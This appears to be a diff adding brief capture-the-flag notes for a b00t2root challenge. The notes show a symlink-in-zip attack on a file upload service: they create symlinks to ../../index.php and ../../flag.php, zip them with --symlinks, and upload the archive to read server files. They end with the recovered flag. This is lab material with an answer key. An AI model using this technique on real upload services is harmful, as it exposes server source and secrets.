@@ -1,0 +1,15 @@
+It's http://165.227.194.206:8002/, not http://165.227.194.206:80/
+
+Upload test.zip
+	http://165.227.194.206:8002/archives/e1a4a000-5617-4a3b-b7eb-433639660469/test.txt
+
+# index.php
+ln -s ../../index.php index.php
+zip --symlinks myzip.zip index.php
+
+# flag.php
+ln -s ../../flag.php flag.php
+zip --symlinks myzip.zip flag.php
+	<?php
+	$flag = "b00t2root{symlink_is_all_i_need}";
+	?>
